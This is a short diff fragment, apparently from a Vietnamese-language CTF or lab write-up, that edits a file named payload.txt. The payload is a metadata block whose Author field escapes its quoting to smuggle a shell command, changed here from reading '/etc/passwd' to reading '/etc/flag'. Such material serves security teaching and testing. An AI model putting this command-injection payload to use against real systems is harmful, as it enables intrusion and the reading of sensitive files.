@@ -45,7 +45,7 @@ Tạo file payload.txt với nội dụng:
 ```
 (metadata
     (Author "\
-" . cat '/etc/passwd'; #")
+" . cat '/etc/flag'; #")
 )
 ```
 
